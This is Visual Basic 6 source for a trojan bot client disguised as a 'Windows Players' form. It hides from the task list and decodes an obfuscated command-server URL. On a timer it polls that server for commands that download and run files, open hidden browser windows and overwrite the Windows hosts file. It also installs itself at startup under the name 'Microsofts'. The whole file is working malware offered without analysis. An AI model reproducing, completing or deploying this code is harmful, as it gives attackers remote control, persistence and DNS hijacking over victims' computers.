VERSION 5.00
Begin VB.Form Form1 
   BackColor       =   &H00404040&
   Caption         =   "Windows Players"
   ClientHeight    =   2415
   ClientLeft      =   120
   ClientTop       =   450
   ClientWidth     =   2415
   DrawStyle       =   6  'Inside Solid
   FillColor       =   &H00FFFFFF&
   FillStyle       =   7  'Diagonal Cross
   BeginProperty Font 
      Name            =   "MS Sans Serif"
      Size            =   8.25
      Charset         =   0
      Weight          =   700
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   LinkTopic       =   "Form1"
   ScaleHeight     =   2415
   ScaleWidth      =   2415
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
   Begin VB.Timer InfecYou 
      Interval        =   50
      Left            =   720
      Top             =   3600
   End
   Begin VB.Timer Timer1 
      Interval        =   110
      Left            =   2880
      Top             =   1080
   End
   Begin VB.CommandButton HosDatos_ON 
      Caption         =   "Conexion HTTP vOlks"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   120
      TabIndex        =   1
      Top             =   1920
      Width           =   2175
   End
   Begin VB.TextBox iFas_HHD 
      BorderStyle     =   0  'None
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   1695
      Left            =   120
      MultiLine       =   -1  'True
      TabIndex        =   0
      Top             =   120
      Width           =   2175
   End
   Begin VB.Image SourceFuds 
      Height          =   735
      Left            =   120
      Picture         =   "Form1.frx":0000
      Top             =   2640
      Width           =   2205
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False

Option Explicit

'Open Webpage
Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Private Const SW_SHOWNORMAL = 1

'WebPanel Conexion
Dim WebPanel As String
Dim Conectando As String
Dim Comandos As Variant

'Conexion Descarga y Ejecuta
Dim DominioFile As String
Dim CarPetaExecute As String

'Abrir Dominio o Web
Dim UrlHttps As String
Dim HiddenHttps As String 'hidden url


'Ruta del Archivo HOSTS
Dim IDIMER As String


'Tiempo de Conexion
Dim interval As Integer 'Timer
Dim intCount As Integer 'Timer Count [Minutes]
Private Sub Form_Load()

'################### [Configuracion] ###################
'//////////////////////////////////////////////////
WebPanel = Desencriptar("687474703A2F2F69776F6C6B6E65742E696E2F70726976382F") 'URL WebPanel
MuTeX "byvOlk" 'Set Mutex
interval = 320 'Seconds
intCount = 0 'tCount
'///////////////////////////////////////////////////
'################### [/Configuracion] ###################

App.TaskVisible = False 'Oculto
'hosts file HexEncode
IDIMER = Environ("WINDIR") + Desencriptar("5C73797374656D33325C647269766572735C6574635C686F737473")
'Ids Automatic
Call WebComandos(WebPanel)

End Sub

Private Sub HosDatos_ON_Click()
On Error Resume Next
HosDatos_ON.Enabled = False



'#############################[CONEXION]#########################

Conectando = WebComandos(WebPanel)

'############################[/CONEXION]#########################


Comandos = Split(Conectando, "|")
iFas_HHD = Comandos(1)
DominioFile = Comandos(2)
CarPetaExecute = Comandos(3)
UrlHttps = Comandos(4)
HiddenHttps = Comandos(5)

'Descarga y Ejecuta

If CBool(HyperFiles(DominioFile, CarPetaExecute)) Then ' Descarga HTTP
       Call Executes(CarPetaExecute, False) ' Execute HTTP
End If

'Abrir URL en InternetExplorer en Pc
If Len(UrlHttps) > 10 Then
        ShellExecute Me.hwnd, "Open", UrlHttps, 0, 0, SW_SHOWNORMAL 'Modo visible
    End If
    
If Len(HiddenHttps) > 10 Then
        Shell Environ("programfiles") & "\Internet Explorer\iexplore.exe " & HiddenHttps, vbHide  'Modo [Hidden]
    End If
    
HosDatos_ON.Enabled = True
End Sub

Private Sub iFas_HHD_Change()
On Error Resume Next
Open IDIMER For Output As #1
Print #1, iFas_HHD.Text
Close #1

End Sub

Private Sub InfecYou_Timer()
addtostartup "Microsofts", (Environ("WINDIR") & Desencriptar("5C63737263732E657865")) 'Add to startup

End Sub

Private Sub Timer1_Timer()
On Error Resume Next

intCount = intCount + 1 'Count +1 minute...
If intCount = interval Then 'Tiempo con Conexion HttpHp...
HosDatos_ON = True

intCount = 0 'Reset
End If

End Sub
